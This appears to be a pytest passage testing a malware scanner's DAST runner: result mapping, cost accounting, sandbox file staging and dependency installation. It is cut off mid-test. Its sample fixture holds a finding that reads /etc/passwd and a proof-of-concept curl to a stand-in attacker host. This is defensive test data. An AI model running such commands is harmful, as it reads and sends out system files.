"""Unit tests for DAST-102 — dast.runner.

Exercises the translation helpers (engine ↔ orchestrator shape mapping),
the generic factory (with mocked run_dast), and the env-driven
production factory (returns None when config missing, returns a callable
when env vars set).

No live API; no Fly calls.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

import pytest

from dast import runner as dast_runner_mod
from dast.orchestrator import DastResult, IterationStats
from dast.runner import (
    _dast_result_to_engine_dict,
    _scan_result_to_l1_output,
    make_dast_runner,
    make_dast_runner_from_env,
)
from scanner.engine import ScanResult


# ── Translation: scan_result → l1_output ───────────────────────────────────


def _sample_scan_result() -> ScanResult:
    r = ScanResult(
        filename="exfil.py",
        file_hash="abc123",
        language="python",
        triage_classification="HIGH",
        triage_reason="...",
        final_verdict="critical_malicious",
        risk_score=95,
        risk_level="critical",
    )
    r.vulnerabilities = [
        {
            "type": "data_exfiltration",
            "severity": "critical",
            "line": 4,
            "code": "open('/etc/passwd').read()",
            "explanation": "reads sensitive system file",
            "data_flow_trace": "file_read -> base64 -> http",
            "proof_of_concept": "curl 'http://attacker.example.com/...'",
            "cwe": "CWE-200",
            "confidence": 0.95,
        },
        {
            "type": "ssrf",
            "severity": "high",
            "line": 6,
            "code": "urlopen(f'http://...')",
            "explanation": "outbound to attacker host",
        },
    ]
    r.behavioral_profile = {"sensitivity": "critical"}
    r.attack_chains = [{"name": "passwd_exfil"}]
    return r


def test_translation_maps_vulnerabilities_to_hypotheses() -> None:
    out = _scan_result_to_l1_output(_sample_scan_result())
    assert out["verdict"] == {"verdict_label": "critical_malicious"}
    assert len(out["hypotheses"]) == 2

    h1 = out["hypotheses"][0]
    assert h1["id"] == "H001"
    # finding_ref must equal id — the orchestrator only counts confirmed
    # hypotheses into new_confirmed_findings / findings_validated when
    # finding_ref is set. Without this, DAST telemetry showed 0
    # confirmed findings even when 4 hypotheses were confirmed.
    assert h1["finding_ref"] == "H001"
    assert h1["finding_type"] == "data_exfiltration"
    assert h1["severity"] == "critical"
    assert h1["line"] == 4
    assert h1["confidence"] == 0.95
    assert h1["cwe"] == "CWE-200"

    h2 = out["hypotheses"][1]
    assert h2["id"] == "H002"
    assert h2["finding_ref"] == "H002"
    assert h2["finding_type"] == "ssrf"
    # Defaults applied for missing fields
    assert h2["confidence"] == 0.5
    assert h2["data_flow_trace"] == ""

    assert out["behavioral_profile"] == {"sensitivity": "critical"}
    assert out["attack_chains"] == [{"name": "passwd_exfil"}]


def test_translation_handles_no_vulnerabilities() -> None:
    r = _sample_scan_result()
    r.vulnerabilities = []
    out = _scan_result_to_l1_output(r)
    assert out["hypotheses"] == []
    assert out["verdict"]["verdict_label"] == "critical_malicious"


# ── Mapping: DastResult → engine dict ──────────────────────────────────────


def _sample_dast_result() -> DastResult:
    s1 = IterationStats(
        iter=1,
        new_confirmed_findings=2,
        hypotheses_proposed=3,
        hypotheses_accepted=2,
        hypotheses_rejected=1,
        sandbox_calls=5,
        elapsed_s=12.5,
        current_verdict_label="malicious",
    )
    s2 = IterationStats(
        iter=2,
        new_confirmed_findings=1,
        hypotheses_proposed=1,
        hypotheses_accepted=1,
        hypotheses_rejected=0,
        sandbox_calls=2,
        elapsed_s=8.0,
        iter_erosion_guard_fired=True,
        current_verdict_label="critical_malicious",
    )
    return DastResult(
        file_id="abc123",
        iterations=[s1, s2],
        final_verdict={"verdict_label": "critical_malicious", "confidence": 0.9},
        findings_validated=["F1", "F2"],
        total_tokens_in=10000,
        total_tokens_out=5000,
        total_sandbox_calls=7,
        elapsed_s=20.5,
        stop_reason="reached_max_iterations",
        journal_path=__import__("pathlib").Path("/tmp/journal"),
    )


def test_mapping_basic() -> None:
    out = _dast_result_to_engine_dict(_sample_dast_result(), elapsed_ms=20500)
    assert out["validated_findings"] == ["F1", "F2"]
    assert out["final_verdict"]["verdict_label"] == "critical_malicious"
    assert out["elapsed_ms"] == 20500
    assert out["stop_reason"] == "reached_max_iterations"
    assert len(out["iterations"]) == 2
    assert out["iterations"][1]["iter_erosion_guard_fired"] is True


def test_mapping_cost_math() -> None:
    """10000 in × $3/M + 5000 out × $15/M = 0.030 + 0.075 = 0.105."""
    out = _dast_result_to_engine_dict(_sample_dast_result(), elapsed_ms=0)
    assert out["total_cost_usd"] == pytest.approx(0.105)


def test_mapping_threads_phase_d_variant_fields() -> None:
    """Regression guard: variant_analysis + variant_remediation MUST
    appear in the engine-dict output. Earlier versions of this mapper
    omitted them, so Phase D fired correctly inside the orchestrator
    but the engine + scan JSON saw empty fields — making the feature
    invisible end-to-end."""
    r = _sample_dast_result()
    r.variant_analysis = [
        {
            "seed_finding_id": "F1",
            "candidates_total": 2,
            "candidates_judged": 2,
            "candidates_verified": 1,
            "confirmed_variant_ids": ["D-F1-0"],
        }
    ]
    r.variant_remediation = {
        "applied": True,
        "files_patched": ["app.py", "lib/downloaders.py"],
        "patched_finding_ids": ["F1", "D-F1-0"],
    }
    out = _dast_result_to_engine_dict(r, elapsed_ms=0)
    assert out["variant_analysis"] == r.variant_analysis
    assert out["variant_remediation"] == r.variant_remediation


def test_mapping_phase_d_empty_when_unused() -> None:
    """When Phase D was disabled or didn't fire, variant_analysis must
    be an empty list (not omitted) and variant_remediation must be
    None — downstream consumers depend on the keys being present."""
    out = _dast_result_to_engine_dict(_sample_dast_result(), elapsed_ms=0)
    assert out["variant_analysis"] == []
    assert out["variant_remediation"] is None


# ── make_dast_runner end-to-end (mocked run_dast) ──────────────────────────


@dataclass
class _FakeStubSandbox:
    file_content_map: dict[str, bytes] = field(default_factory=dict)


@dataclass
class _FakePreprocessing:
    file_hash: str = "fake_hash_123"


@pytest.mark.asyncio
async def test_runner_calls_orchestrator_with_correct_payload(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path,
) -> None:
    captured: dict[str, Any] = {}

    async def fake_run_dast(**kwargs: Any) -> DastResult:
        captured.update(kwargs)
        return _sample_dast_result()

    monkeypatch.setattr(dast_runner_mod, "run_dast", fake_run_dast)

    inference_calls: list = []

    async def fake_inference(prompt, options, schema):
        inference_calls.append((prompt[:20], options, schema))
        return {"text": "{}", "usage": {}, "finish_reason": "stop"}

    sandbox = _FakeStubSandbox()
    runner = make_dast_runner(
        inference=fake_inference,
        sandbox=sandbox,
        journal_dir=tmp_path / "journals",
    )

    pp = _FakePreprocessing(file_hash="abc123")
    scan_result = _sample_scan_result()
    out = await runner("exfil.py", b"import os\n", pp, scan_result)

    # Orchestrator received the right shape
    assert captured["file_record"]["file_id"] == "abc123"
    assert captured["file_record"]["source_text"] == "import os\n"
    assert captured["sandbox"] is sandbox
    assert captured["inference"] is fake_inference
    # Engine-shape output
    assert out["validated_findings"] == ["F1", "F2"]
    assert out["final_verdict"]["verdict_label"] == "critical_malicious"
    assert out["total_cost_usd"] == pytest.approx(0.105)

    # File content was loaded into the sandbox map
    assert sandbox.file_content_map["abc123"] == b"import os\n"


@pytest.mark.asyncio
async def test_runner_falls_back_to_filename_when_no_file_hash(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path,
) -> None:
    captured: dict[str, Any] = {}

    async def fake_run_dast(**kwargs: Any) -> DastResult:
        captured.update(kwargs)
        return _sample_dast_result()

    monkeypatch.setattr(dast_runner_mod, "run_dast", fake_run_dast)

    runner = make_dast_runner(
        inference=lambda *a, **kw: None,  # type: ignore[arg-type, return-value]
        sandbox=_FakeStubSandbox(),
        journal_dir=tmp_path,
    )
    # pp has no file_hash → falls back to filename
    pp = _FakePreprocessing(file_hash="")
    await runner("anon.py", b"x = 1\n", pp, _sample_scan_result())
    assert captured["file_record"]["file_id"] == "anon.py"


@pytest.mark.asyncio
async def test_runner_resolves_project_root_without_relative_imports(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path,
) -> None:
    """DAST-302 regression: ``project_root`` MUST be resolved for any
    Python entry file whose project has a marker (pyproject.toml /
    setup.py / etc.) — independent of whether the entry imports
    siblings via relative imports.

    The v4 synthetic scan revealed that earlier nesting under
    ``if sibling_files:`` made project_root empty for stdlib-only
    seeds, silently degrading Phase D to same-file mode."""
    project = tmp_path / "myproj"
    project.mkdir()
    (project / "pyproject.toml").write_text(
        '[project]\nname = "myproj"\n', encoding="utf-8"
    )
    entry = project / "app.py"
    # Stdlib-only — NO relative imports. This is the synthetic test
    # project's exact shape, the case that previously broke.
    entry.write_text(
        "import urllib.request\n"
        "def fetch_url(url):\n"
        "    return urllib.request.urlopen(url).read()\n",
        encoding="utf-8",
    )

    captured: dict[str, Any] = {}

    async def fake_run_dast(**kwargs: Any) -> DastResult:
        captured.update(kwargs)
        return _sample_dast_result()

    monkeypatch.setattr(dast_runner_mod, "run_dast", fake_run_dast)

    runner = make_dast_runner(
        inference=lambda *a, **kw: None,  # type: ignore[arg-type, return-value]
        sandbox=_FakeStubSandbox(),
        journal_dir=tmp_path / "journals",
    )
    pp = _FakePreprocessing(file_hash="hh")
    await runner(
        "app.py",
        entry.read_bytes(),
        pp,
        _sample_scan_result(),
        host_path=str(entry),
    )

    file_record = captured["file_record"]
    assert file_record["host_path"] == str(entry)
    # The critical regression assertion: project_root is set even
    # though sibling_files is empty (no relative imports).
    assert file_record["project_root"] == str(project)


@pytest.mark.asyncio
async def test_runner_skips_project_root_for_bare_basename(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path,
) -> None:
    """When host_path isn't absolute (older callers / programmatic
    use without a CLI), we must NOT walk from cwd — that could
    resolve a wildly wrong project root. project_root stays empty."""
    captured: dict[str, Any] = {}

    async def fake_run_dast(**kwargs: Any) -> DastResult:
        captured.update(kwargs)
        return _sample_dast_result()

    monkeypatch.setattr(dast_runner_mod, "run_dast", fake_run_dast)

    runner = make_dast_runner(
        inference=lambda *a, **kw: None,  # type: ignore[arg-type, return-value]
        sandbox=_FakeStubSandbox(),
        journal_dir=tmp_path / "journals",
    )
    pp = _FakePreprocessing(file_hash="hh")
    # host_path=None — older caller shape, no CLI in play
    await runner("anon.py", b"x = 1\n", pp, _sample_scan_result())
    assert captured["file_record"]["project_root"] == ""


# ── DAST-302 Bug #5: Phase D project-tree sandbox staging ─────────────


def _make_phase_d_synthetic_project(tmp_path) -> tuple[Any, Any]:
    """Mirrors /tmp/argus_phase_d_test layout used in the v7 scan:
    app.py (seed, stdlib-only imports) + lib/downloaders.py (variants)
    + pyproject.toml marker."""
    project = tmp_path / "blast_radius_proj"
    project.mkdir()
    (project / "pyproject.toml").write_text(
        '[project]\nname = "br"\n', encoding="utf-8"
    )
    entry = project / "app.py"
    entry.write_text(
        "import urllib.request\n"
        "def fetch_url(url):\n"
        "    return urllib.request.urlopen(url).read()\n",
        encoding="utf-8",
    )
    lib = project / "lib"
    lib.mkdir()
    (lib / "__init__.py").write_text("", encoding="utf-8")
    (lib / "downloaders.py").write_text(
        "import urllib.request\n"
        "def download_image(url):\n"
        "    return urllib.request.urlopen(url).read(500)\n",
        encoding="utf-8",
    )
    return project, entry


@pytest.mark.asyncio
async def test_phase_d_stages_project_tree_for_cross_file_variants(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path,
) -> None:
    """Bug #5 regression: when --enable-phase-d is set and project_root
    resolves, every .py file under the project must land in the
    sandbox's additional_files_map so cross-file variant harnesses
    (``import lib.downloaders``) can resolve at sandbox runtime. The
    pre-Fix-#5 behavior shipped only files reached via relative imports
    in the seed, so a stdlib-only seed left lib/downloaders.py
    unstaged, every variant harness hit ModuleNotFoundError, and the
    deterministic oracle check refuted them."""
    project, entry = _make_phase_d_synthetic_project(tmp_path)

    async def fake_run_dast(**kwargs: Any) -> DastResult:
        return _sample_dast_result()

    monkeypatch.setattr(dast_runner_mod, "run_dast", fake_run_dast)

    sandbox = _FakeStubSandbox()
    # additional_files_map is the staging surface; FakeStubSandbox must
    # expose it for the helper to populate.
    sandbox.additional_files_map = {}  # type: ignore[attr-defined]

    runner = make_dast_runner(
        inference=lambda *a, **kw: None,  # type: ignore[arg-type, return-value]
        sandbox=sandbox,
        journal_dir=tmp_path / "journals",
    )
    pp = _FakePreprocessing(file_hash="bug5")
    await runner(
        "app.py",
        entry.read_bytes(),
        pp,
        _sample_scan_result(),
        host_path=str(entry),
        enable_phase_d=True,
    )

    staged = sandbox.additional_files_map.get("bug5", {})
    # The variant file is the critical assertion.
    assert "lib/downloaders.py" in staged
    # The __init__.py must also be staged so ``import lib.downloaders``
    # resolves as a package (rather than ImportError on missing
    # namespace).
    assert "lib/__init__.py" in staged
    # The seed/entry file is NOT in additional_files_map — it's staged
    # separately via file_content_map. Double-staging would cause
    # dast-init to extract it twice.
    assert "app.py" not in staged
    # Sanity: file content is preserved verbatim (no decode/re-encode).
    assert b"download_image" in staged["lib/downloaders.py"]


@pytest.mark.asyncio
async def test_phase_d_staging_skipped_when_flag_off(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path,
) -> None:
    """Back-compat: with --enable-phase-d OFF (the default), the
    project-tree staging block must NOT fire. Pre-Fix-#5 behavior
    preserved for every scan that doesn't opt into Phase D."""
    project, entry = _make_phase_d_synthetic_project(tmp_path)

    async def fake_run_dast(**kwargs: Any) -> DastResult:
        return _sample_dast_result()

    monkeypatch.setattr(dast_runner_mod, "run_dast", fake_run_dast)

    sandbox = _FakeStubSandbox()
    sandbox.additional_files_map = {}  # type: ignore[attr-defined]

    runner = make_dast_runner(
        inference=lambda *a, **kw: None,  # type: ignore[arg-type, return-value]
        sandbox=sandbox,
        journal_dir=tmp_path / "journals",
    )
    pp = _FakePreprocessing(file_hash="noflag")
    # enable_phase_d defaults to False.
    await runner(
        "app.py",
        entry.read_bytes(),
        pp,
        _sample_scan_result(),
        host_path=str(entry),
    )
    # Nothing got staged (the seed file has no relative imports so
    # sibling resolver also returned empty).
    assert sandbox.additional_files_map.get("noflag", {}) == {}


@pytest.mark.asyncio
async def test_phase_d_staging_excludes_node_modules_and_pycache(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path,
) -> None:
    """Reuse of code_graph's EXCLUDED_DIR_NAMES — vendored deps and
    bytecode caches MUST NOT bloat sandbox uploads."""
    project, entry = _make_phase_d_synthetic_project(tmp_path)
    # Add dirs that MUST be excluded.
    (project / "node_modules").mkdir()
    (project / "node_modules" / "evil.py").write_text(
        "def vendor_junk():\n    pass\n", encoding="utf-8"
    )
    (project / "__pycache__").mkdir()
    (project / "__pycache__" / "stale.py").write_text(
        "def cache_junk():\n    pass\n", encoding="utf-8"
    )
    (project / ".venv").mkdir()
    (project / ".venv" / "venv_lib.py").write_text(
        "def venv_junk():\n    pass\n", encoding="utf-8"
    )

    async def fake_run_dast(**kwargs: Any) -> DastResult:
        return _sample_dast_result()

    monkeypatch.setattr(dast_runner_mod, "run_dast", fake_run_dast)

    sandbox = _FakeStubSandbox()
    sandbox.additional_files_map = {}  # type: ignore[attr-defined]

    runner = make_dast_runner(
        inference=lambda *a, **kw: None,  # type: ignore[arg-type, return-value]
        sandbox=sandbox,
        journal_dir=tmp_path / "journals",
    )
    pp = _FakePreprocessing(file_hash="excl")
    await runner(
        "app.py",
        entry.read_bytes(),
        pp,
        _sample_scan_result(),
        host_path=str(entry),
        enable_phase_d=True,
    )
    staged = sandbox.additional_files_map.get("excl", {})
    rel_paths = set(staged.keys())
    # Forbidden directories never appear (POSIX-style or with separator).
    assert not any("node_modules" in p for p in rel_paths)
    assert not any("__pycache__" in p for p in rel_paths)
    assert not any(".venv" in p for p in rel_paths)
    # But the legit variant file is still there.
    assert "lib/downloaders.py" in rel_paths


@pytest.mark.asyncio
async def test_phase_d_staging_skips_non_python_targets(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path,
) -> None:
    """Cross-file code graph is Python-only in v1.1. Skip staging for
    TS/JS targets — they'd add upload cost without enabling any
    cross-file behavior yet."""
    project = tmp_path / "ts_proj"
    project.mkdir()
    (project / "package.json").write_text('{"name":"ts"}\n', encoding="utf-8")
    entry = project / "app.ts"
    entry.write_text("export function fetchUrl(u: string) {}\n", encoding="utf-8")
    (project / "helper.ts").write_text(
        "export function downloader(u: string) {}\n", encoding="utf-8"
    )

    async def fake_run_dast(**kwargs: Any) -> DastResult:
        return _sample_dast_result()

    monkeypatch.setattr(dast_runner_mod, "run_dast", fake_run_dast)

    sandbox = _FakeStubSandbox()
    sandbox.additional_files_map = {}  # type: ignore[attr-defined]

    runner = make_dast_runner(
        inference=lambda *a, **kw: None,  # type: ignore[arg-type, return-value]
        sandbox=sandbox,
        journal_dir=tmp_path / "journals",
    )
    pp = _FakePreprocessing(file_hash="tsproj")
    await runner(
        "app.ts",
        entry.read_bytes(),
        pp,
        _sample_scan_result(),
        host_path=str(entry),
        enable_phase_d=True,
    )
    # Phase D staging only runs for Python — TS project gets nothing
    # extra from the Phase D code-graph block. The sibling resolver
    # may still stage files via its own logic for ESM imports + the
    # v15.13 package.json safety net. We assert the Phase-D-specific
    # contract: no Python-resolver-style staging (no .py files, no
    # cross-file code graph). package.json is allowed (it's a v15.13
    # JS-side fix unrelated to Phase D).
    staged = sandbox.additional_files_map.get("tsproj", {})
    py_files = [k for k in staged if k.endswith(".py")]
    assert py_files == []


@pytest.mark.asyncio
async def test_phase_d_staging_normalizes_windows_path_separators(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path,
) -> None:
    """The sandbox is Linux — additional_files_map keys MUST use
    POSIX-style forward slashes regardless of the host OS, so
    ``/workspace/lib/downloaders.py`` resolves correctly at extraction.
    Windows ``Path`` operations yield backslashes by default; the
    staging helper must normalize them."""
    project, entry = _make_phase_d_synthetic_project(tmp_path)

    async def fake_run_dast(**kwargs: Any) -> DastResult:
        return _sample_dast_result()

    monkeypatch.setattr(dast_runner_mod, "run_dast", fake_run_dast)

    sandbox = _FakeStubSandbox()
    sandbox.additional_files_map = {}  # type: ignore[attr-defined]

    runner = make_dast_runner(
        inference=lambda *a, **kw: None,  # type: ignore[arg-type, return-value]
        sandbox=sandbox,
        journal_dir=tmp_path / "journals",
    )
    pp = _FakePreprocessing(file_hash="norm")
    await runner(
        "app.py",
        entry.read_bytes(),
        pp,
        _sample_scan_result(),
        host_path=str(entry),
        enable_phase_d=True,
    )
    staged = sandbox.additional_files_map.get("norm", {})
    # No backslashes anywhere in staged keys.
    assert all("\\" not in p for p in staged.keys()), (
        f"Backslashes leaked into staged paths: {list(staged.keys())}"
    )


@pytest.mark.asyncio
async def test_phase_d_staging_preserves_sibling_resolved_entries(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path,
) -> None:
    """When a file is both relative-imported by the seed AND found by
    the project-tree walk, the sibling-resolved version wins (it carries
    entry-relative context the broader walk doesn't apply). Verified
    by pre-populating additional_files_map with a distinct content
    payload and asserting it survives."""
    project, entry = _make_phase_d_synthetic_project(tmp_path)

    async def fake_run_dast(**kwargs: Any) -> DastResult:
        return _sample_dast_result()

    monkeypatch.setattr(dast_runner_mod, "run_dast", fake_run_dast)

    sandbox = _FakeStubSandbox()
    # Simulate: sibling resolver pre-staged lib/downloaders.py with a
    # custom payload. The project-tree staging must NOT overwrite it.
    sandbox.additional_files_map = {  # type: ignore[attr-defined]
        "preserve": {"lib/downloaders.py": b"SIBLING_RESOLVED_VERSION"}
    }

    runner = make_dast_runner(
        inference=lambda *a, **kw: None,  # type: ignore[arg-type, return-value]
        sandbox=sandbox,
        journal_dir=tmp_path / "journals",
    )
    pp = _FakePreprocessing(file_hash="preserve")
    await runner(
        "app.py",
        entry.read_bytes(),
        pp,
        _sample_scan_result(),
        host_path=str(entry),
        enable_phase_d=True,
    )
    staged = sandbox.additional_files_map["preserve"]
    # Pre-populated sibling version is intact.
    assert staged["lib/downloaders.py"] == b"SIBLING_RESOLVED_VERSION"


# ── make_dast_runner_from_env ──────────────────────────────────────────────


def test_from_env_returns_none_when_anthropic_missing(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)
    monkeypatch.setenv("FLY_API_TOKEN", "fake")
    monkeypatch.setenv("ECHO_DAST_IMAGE_LEAN", "fake-image:v1")
    assert make_dast_runner_from_env() is None


def test_from_env_returns_none_when_fly_token_missing(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-test")
    monkeypatch.delenv("FLY_API_TOKEN", raising=False)
    monkeypatch.setenv("ECHO_DAST_IMAGE_LEAN", "fake-image:v1")
    assert make_dast_runner_from_env() is None


def test_from_env_returns_none_when_image_missing(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-test")
    monkeypatch.setenv("FLY_API_TOKEN", "fly-test")
    monkeypatch.delenv("ECHO_DAST_IMAGE_LEAN", raising=False)
    assert make_dast_runner_from_env() is None


def test_from_env_returns_callable_when_all_set(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """With all required env vars, returns a callable runner. We don't
    exercise it (would need Fly + Anthropic) — the type confirms wiring.
    """
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-test")
    monkeypatch.setenv("FLY_API_TOKEN", "fly-test")
    monkeypatch.setenv("ECHO_DAST_IMAGE_LEAN", "registry.fly.io/argus-dast-sandbox:lean-v1")
    runner = make_dast_runner_from_env()
    assert runner is not None
    assert callable(runner)


def test_from_env_explicit_api_key_overrides_env(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)
    monkeypatch.setenv("FLY_API_TOKEN", "fly-test")
    monkeypatch.setenv("ECHO_DAST_IMAGE_LEAN", "fake:v1")
    runner = make_dast_runner_from_env(api_key="sk-from-arg")
    assert runner is not None


# ── v1.8 P2b: per-tier memory allocation (SANDBOX_MEMORY_MB_BY_TIER) ────────


def test_sandbox_memory_per_tier_table_values() -> None:
    """Verify the v1.8 P2b memory contract per image tier:
      * lean       = 1024 MB  (50% reduction vs old flat 2 GB; ample for lean's footprint)
      * rich_python = 2048 MB (unchanged Goldilocks tier for scipy/sklearn workloads)
      * ml_tools   = 4096 MB  (2x bump to eliminate OOM on legit torch model-loader exploits)

    The keys must exactly match SANDBOX_IMAGE_HINTS — divergence here
    silently falls back to the 2048 MB default and ml_tools risks OOM."""
    from dast.sandbox.client import SANDBOX_IMAGE_HINTS, SANDBOX_MEMORY_MB_BY_TIER

    assert set(SANDBOX_MEMORY_MB_BY_TIER.keys()) == set(SANDBOX_IMAGE_HINTS)
    assert SANDBOX_MEMORY_MB_BY_TIER["lean"] == 1024
    assert SANDBOX_MEMORY_MB_BY_TIER["rich_python"] == 2048
    assert SANDBOX_MEMORY_MB_BY_TIER["ml_tools"] == 4096


# ── v1.8 P2a v0.2: centralized runtime_packages widening ──────────────────


@pytest.mark.asyncio
async def test_multi_image_submit_populates_runtime_packages_when_enabled(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """v0.2 widening: MultiImageSandboxClient.submit() populates
    plan.runtime_packages from the target file's imports if (a) the
    flag is on, (b) the plan-builder didn't already set it, and
    (c) the image_hint admits dep install (rich_python / ml_tools).

    Covers EVERY plan-build path centrally — Phase 3 Stage 2,
    runtime probe variants, behavioral probe etc. all benefit
    without needing per-site wiring."""
    from dast.sandbox.client import (
        MultiImageSandboxClient,
        SandboxPlan,
        StubSandboxClient,
    )

    file_id = "fid"
    src = b"import selenium  # not preinstalled in rich_python\n"
    stub = StubSandboxClient()
    stub.file_content_map = {file_id: src}

    sandbox = MultiImageSandboxClient(
        inner_by_hint={"lean": stub, "rich_python": stub, "ml_tools": stub},
        fallback_hint="lean",
        enable_per_scan_dep_install=True,
    )

    plan = SandboxPlan(
        plan_id="p1",
        file_id=file_id,
        hypothesis_id="h1",
        commands=["true"],
        expected_oracle="",
        payload="",
        timeout_sec=5,
        image_hint="rich_python",
        file_name="evil.py",
        # runtime_packages NOT set → centralized fallback must populate
    )

    await sandbox.submit(plan)

    # selenium is not in rich_python's preinstalled set → should be added
    assert "selenium" in plan.runtime_packages


@pytest.mark.asyncio
async def test_multi_image_submit_lean_preserved_when_no_install_needed() -> None:
    """lean tier stays lean when the target file imports only stdlib +
    packages already preinstalled in lean. The v0.1 contract — lean is
    the minimal tier — is preserved for the common case.

    (As of the v0.2 hotfix, lean plans with NICHE imports get
    auto-bumped to rich_python; see ``test_multi_image_submit_lean_
    bumps_to_rich_python_when_install_needed``.)"""
    from dast.sandbox.client import (
        MultiImageSandboxClient,
        SandboxPlan,
        StubSandboxClient,
    )

    stub = StubSandboxClient()
    # All stdlib + preinstalled-in-lean → nothing to install → no bump.
    stub.file_content_map = {"fid": b"import os\nimport json\nimport requests\nimport numpy\n"}

    sandbox = MultiImageSandboxClient(
        inner_by_hint={"lean": stub, "rich_python": stub, "ml_tools": stub},
        fallback_hint="lean",
        enable_per_scan_dep_install=True,
    )

    plan = SandboxPlan(
        plan_id="p2",
        file_id="fid",
        hypothesis_id="h2",
        commands=["true"],
        expected_oracle="",
        payload="",
        timeout_sec=5,
        image_hint="lean",
        file_name="benign.py",
    )

    await sandbox.submit(plan)

    # No installs needed → lean preserved
    assert plan.runtime_packages == []
    assert plan.image_hint == "lean"


@pytest.mark.asyncio
async def test_multi_image_submit_lean_bumps_to_rich_python_when_install_needed() -> None:
    """v0.2 HOTFIX (post-empirical Q2 verification): when a lean plan's
    target imports niche packages (NOT preinstalled in lean), the
    central instrumentation auto-bumps the plan to rich_python AND
    populates runtime_packages.

    The bug this fixes: Sonnet's plan-time tier selection isn't always
    reliable. Fly logs from a real e2e scan showed Sonnet picking lean
    for a file with ``import selenium`` → install never fires →
    ``ModuleNotFoundError: No module named 'selenium'`` ends every plan
    at top-level import. The auto-bump catches this corner.

    The lean-tier no-install identity is preserved for benign plans
    (test above); this test pins the niche-import escape path."""
    from dast.sandbox.client import (
        MultiImageSandboxClient,
        SandboxPlan,
        StubSandboxClient,
    )

    stub = StubSandboxClient()
    # selenium is NOT in lean's preinstalled set → triggers bump.
    stub.file_content_map = {"fid": b"import selenium\nimport os\n"}

    sandbox = MultiImageSandboxClient(
        inner_by_hint={"lean": stub, "rich_python": stub, "ml_tools": stub},
        fallback_hint="lean",
        enable_per_scan_dep_install=True,
    )

    plan = SandboxPlan(
        plan_id="p2-bump",
        file_id="fid",
        hypothesis_id="h2",
        commands=["true"],
        expected_oracle="",
        payload="",
        timeout_sec=5,
        image_hint="lean",  # ← Sonnet under-picked
        file_name="evil.py",
    )

    await sandbox.submit(plan)

    # Auto-bump fired: image_hint upgraded, runtime_packages populated
    assert plan.image_hint == "rich_python"
    assert "selenium" in plan.runtime_packages


@pytest.mark.asyncio
async def test_multi_image_submit_no_op_when_disabled() -> None:
    """When enable_per_scan_dep_install=False, submit() must NOT
    populate runtime_packages even on rich_python tier."""
    from dast.sandbox.client import (
        MultiImageSandboxClient,
        SandboxPlan,
        StubSandboxClient,
    )

    stub = StubSandboxClient()
    stub.file_content_map = {"fid": b"import selenium\n"}

    sandbox = MultiImageSandboxClient(
        inner_by_hint={"lean": stub, "rich_python": stub, "ml_tools": stub},
        fallback_hint="lean",
        enable_per_scan_dep_install=False,  # ← disabled
    )

    plan = SandboxPlan(
        plan_id="p3",
        file_id="fid",
        hypothesis_id="h3",
        commands=["true"],
        expected_oracle="",
        payload="",
        timeout_sec=5,
        image_hint="rich_python",
        file_name="evil.py",
    )

    await sandbox.submit(plan)

    assert plan.runtime_packages == []


@pytest.mark.asyncio
async def test_multi_image_submit_respects_explicit_runtime_packages() -> None:
    """When the plan-builder ALREADY set runtime_packages (e.g.,
    orchestrator Phase A site does this explicitly), the centralized
    fallback must NOT overwrite. Belt-and-braces: avoid double-work
    if Phase A and the central path both apply."""
    from dast.sandbox.client import (
        MultiImageSandboxClient,
        SandboxPlan,
        StubSandboxClient,
    )

    stub = StubSandboxClient()
    stub.file_content_map = {"fid": b"import selenium\nimport requests\n"}

    sandbox = MultiImageSandboxClient(
        inner_by_hint={"lean": stub, "rich_python": stub, "ml_tools": stub},
        fallback_hint="lean",
        enable_per_scan_dep_install=True,
    )

    explicit_pkgs = ["explicit_pkg_1", "explicit_pkg_2"]
    plan = SandboxPlan(
        plan_id="p4",
        file_id="fid",
        hypothesis_id="h4",
        commands=["true"],
        expected_oracle="",
        payload="",
        timeout_sec=5,
        image_hint="rich_python",
        file_name="evil.py",
        runtime_packages=list(explicit_pkgs),  # already populated
    )

    await sandbox.submit(plan)

    # Fallback must NOT have run
    assert plan.runtime_packages == explicit_pkgs


# ── JS DAST parity: npm dep installer auto-bump + env wiring ──────────────


@pytest.mark.asyncio
async def test_multi_image_submit_populates_npm_packages_for_js_target() -> None:
    """JS DAST parity (v1.8): MultiImageSandboxClient.submit() populates
    plan.runtime_npm_packages from the target file's require/import
    statements when (a) the flag is on, (b) the plan-builder didn't
    already set it, and (c) the file extension is .js / .mjs / .cjs."""
    from dast.sandbox.client import (
        MultiImageSandboxClient,
        SandboxPlan,
        StubSandboxClient,
    )

    stub = StubSandboxClient()
    stub.file_content_map = {"fid": b"const axios = require('axios');\n"}

    sandbox = MultiImageSandboxClient(
        inner_by_hint={"lean": stub, "rich_python": stub, "ml_tools": stub},
        fallback_hint="lean",
        enable_per_scan_dep_install=True,
    )

    plan = SandboxPlan(
        plan_id="p-js1",
        file_id="fid",
        hypothesis_id="h-js1",
        commands=["true"],
        expected_oracle="",
        payload="",
        timeout_sec=5,
        image_hint="rich_python",
        file_name="evil.js",
    )

    await sandbox.submit(plan)

    assert "axios" in plan.runtime_npm_packages


@pytest.mark.asyncio
async def test_multi_image_submit_lean_js_bumps_to_rich_python() -> None:
    """JS auto-bump: a lean .js plan whose target needs niche npm
    packages graduates to rich_python (same pattern as Python — bump
    catches Sonnet under-classification, and gives JS the 2GB memory
    budget for npm-installed deps)."""
    from dast.sandbox.client import (
        MultiImageSandboxClient,
        SandboxPlan,
